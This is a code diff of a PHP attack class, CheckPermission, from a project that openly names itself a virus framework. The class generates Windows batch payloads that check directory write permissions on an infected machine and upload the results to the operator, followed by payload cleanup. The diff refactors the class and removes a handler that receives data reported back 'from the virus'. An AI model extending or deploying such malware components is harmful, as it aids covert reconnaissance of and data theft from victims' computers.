@@ -1,15 +1,12 @@
-<?php /** @noinspection PhpUnused */
-
-/** @noinspection PhpUnusedParameterInspection */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
-use Kelvinho\Virus\Logs;
 use function Kelvinho\Virus\filter;
 
-class CheckPermission extends AttackInterface {
+class CheckPermission extends AttackBase {
     public static int $PERMISSION_UNSET = -1;
     public static int $PERMISSION_NOT_ALLOWED = 0;
     public static int $PERMISSION_ALLOWED = 1;
@@ -38,9 +35,6 @@ class CheckPermission extends AttackInterface {
             $count = (int)$contents[0];
             $perm = (int)$contents[1];
             if ($count < count($this->directories)) {
-                ob_start();
-                var_dump($contents);
-                Logs::log(ob_get_clean());
                 $this->directories[$count]["perm"] = $perm;
             }
         }
@@ -55,43 +49,16 @@ class CheckPermission extends AttackInterface {
     }
 
     public function getDirectories(int $permission) {
-        return filter($this->directories, function ($directory, $index, $permission) {
+        return filter($this->directories, function ($directory) use ($permission) {
             return $directory["perm"] == $permission;
-        }, $permission);
+        });
     }
 
-    /**
-     * This will generate the intercept code that will be used to take the reported data back from the virus.
-     */
-    //@formatter:off
-    public function generateIntercept(): string {
-        ob_start(); ?>
-        if (isset($_FILES["permFile"])) {
-            $contents = file_get_contents($_FILES["permFile"]["tmp_name"]);
-            $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
-            $attack->setPermissions($contents);
-            $attack->setExecuted();
-            $attack->saveState();
-        }
-        <?php return ob_get_clean();
-    }
-    //@formatter:on
-
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
         $this->directories = $state["directories"];
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
         $state["directories"] = $this->directories;
@@ -104,14 +71,8 @@ class CheckPermission extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start();
+        ob_start(); //@formatter:off
         $hash = hash("sha256", rand()); ?>
         SetLocal EnableDelayedExpansion
         chCp 65001
@@ -130,13 +91,9 @@ class CheckPermission extends AttackInterface {
         :end_payload
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean();
+        return ob_get_clean(); //@formatter:on
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
+    public function processExtras(string $resourceIdentifier): void {
     }
 }
